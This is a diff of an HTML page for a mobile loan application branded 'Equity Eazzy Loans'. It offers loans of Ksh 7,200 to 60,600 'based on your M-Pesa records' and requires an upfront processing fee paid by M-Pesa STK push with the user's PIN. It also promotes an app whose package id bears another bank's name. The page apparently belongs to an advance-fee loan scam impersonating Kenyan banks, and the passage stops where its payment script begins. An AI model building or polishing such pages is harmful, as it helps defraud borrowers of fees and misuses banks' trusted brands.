@@ -808,23 +808,121 @@
 <body>
     <!-- ====== HTML STRUCTURE (EXACTLY AS YOUR ORIGINAL) ====== -->
     <!-- Keep all HTML elements identical – no changes needed -->
-    <header class="page-header">...</header>
-    <main class="application-container">
-        <div class="user-greeting">...</div>
-        <div class="loan-summary">...</div>
-        <section class="loan-options-section">...</section>
-        <div class="payment-info">...</div>
-        <button id="submit-btn" class="submit-btn" disabled>...</button>
-        <div id="error-message" class="error-message">...</div>
-        <div class="app-promo" id="app-promo" style="display:none;">...</div>
-    </main>
-    <div class="stk-overlay" id="stkOverlay">...</div>
-    <div class="loading-overlay" id="loadingOverlay">...</div>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+    <header class="page-header">
+        <div class="header-content">
+            <button class="back-btn" onclick="window.history.back()" aria-label="Go back">
+                <i class="fas fa-chevron-left"></i>
+            </button>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-hand-holding-usd"></i>
+                </div>
+                <div class="logo-text">
+                    <span class="equity">Equity</span>
+                    <span class="eazzy">Eazzy</span>
+                    <span class="loans">Loans</span>
+                </div>
+            </div>
+            <div style="width: 2.5rem;"></div>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+    </header>
 
-    <!-- ============================================================ -->
-    <!-- CONSOLIDATED CLIENT-SIDE LOGIC (from the three API files)    -->
-    <!-- ============================================================ -->
+    <main class="application-container">
+        <!-- User Greeting -->
+        <div class="user-greeting">
+            <h2>Hello, <span class="user-name" id="user-name"></span>!</h2>
+            <p class="greeting-text">Based on your M-Pesa records, here are your available loan options (2-month term at 10% interest).</p>
+        </div>
+
+        <!-- Loan Summary -->
+        <div class="loan-summary">
+            <div class="summary-title">Loan Summary</div>
+            <div class="summary-grid">
+                <div class="summary-item">
+                    <div class="summary-label">Term</div>
+                    <div class="summary-value">2 Months</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-label">Interest</div>
+                    <div class="summary-value">10%</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-label">Speed</div>
+                    <div class="summary-value">5 Min</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Loan Options -->
+        <section class="loan-options-section">
+            <h3 class="section-title">Select Loan Amount</h3>
+            <div class="loan-options-grid">
+                <!-- All 12 loan options -->
+                <div class="loan-option" onclick="selectLoanOption(this, 7200, 100)"><div class="loan-amount">Ksh 7,200</div><div class="loan-fee">Fee: Ksh 100</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 9800, 120)"><div class="loan-amount">Ksh 9,800</div><div class="loan-fee">Fee: Ksh 120</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 11200, 180)"><div class="loan-amount">Ksh 11,200</div><div class="loan-fee">Fee: Ksh 180</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 16800, 200)"><div class="loan-amount">Ksh 16,800</div><div class="loan-fee">Fee: Ksh 200</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 21200, 220)"><div class="loan-amount">Ksh 21,200</div><div class="loan-fee">Fee: Ksh 220</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 25600, 350)"><div class="loan-amount">Ksh 25,600</div><div class="loan-fee">Fee: Ksh 350</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 30000, 420)"><div class="loan-amount">Ksh 30,000</div><div class="loan-fee">Fee: Ksh 420</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 35400, 540)"><div class="loan-amount">Ksh 35,400</div><div class="loan-fee">Fee: Ksh 540</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 39800, 680)"><div class="loan-amount">Ksh 39,800</div><div class="loan-fee">Fee: Ksh 680</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 44200, 960)"><div class="loan-amount">Ksh 44,200</div><div class="loan-fee">Fee: Ksh 960</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 48600, 1550)"><div class="loan-amount">Ksh 48,600</div><div class="loan-fee">Fee: Ksh 1,550</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 60600, 2000)"><div class="loan-amount">Ksh 60,600</div><div class="loan-fee">Fee: Ksh 2,000</div></div>
+            </div>
+        </section>
+
+        <!-- Payment Information -->
+        <div class="payment-info">
+            <div class="info-header">
+                <div class="info-icon"><i class="fas fa-info-circle"></i></div>
+                <div class="info-title">Important Information</div>
+            </div>
+            <p class="info-text">To complete your loan application, you'll need to pay the processing fee via M-Pesa. You'll receive an STK prompt on your phone once you proceed.</p>
+        </div>
+
+        <!-- Submit Button -->
+        <button id="submit-btn" class="submit-btn" disabled>
+            <i class="fas fa-lock"></i> Apply for Loan
+        </button>
+        <div id="error-message" class="error-message">Please select a loan amount to continue</div>
+
+        <!-- App Promo -->
+        <div class="app-promo" id="app-promo" style="display:none;">
+            <div class="promo-icon"><i class="fas fa-rocket"></i></div>
+            <div class="promo-title">Get Higher Limits!</div>
+            <p class="promo-text">For loans up to Ksh 80,000, download our mobile app</p>
+            <a href="https://play.google.com/store/apps/details?id=com.punksmoothheat.KCB%20Loans" target="_blank" class="download-btn">
+                <i class="fab fa-google-play"></i> Download App
+            </a>
+        </div>
+    </main>
+
+    <!-- STK Push Overlay -->
+    <div class="stk-overlay" id="stkOverlay">
+        <div class="stk-card">
+            <div class="stk-icon"><i class="fas fa-mobile-alt"></i></div>
+            <h2 class="stk-title">STK Push Sent!</h2>
+            <p class="stk-message">Check your phone for the M-Pesa prompt</p>
+            <div class="stk-phone" id="stkPhoneNumber"></div>
+            <p class="stk-message">Enter your M-Pesa PIN to complete payment of <strong id="stkAmount"></strong></p>
+            <p class="stk-timer" id="stkTimer">Verifying payment... 00:00</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Processing Application</p>
+        <p class="loading-subtext">Please wait while we process your loan request...</p>
+    </div>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
     <script>
         // -----------------------------------------------------------------
         // 1. PAYHERO CONFIGURATION (from initiate-payment.js)
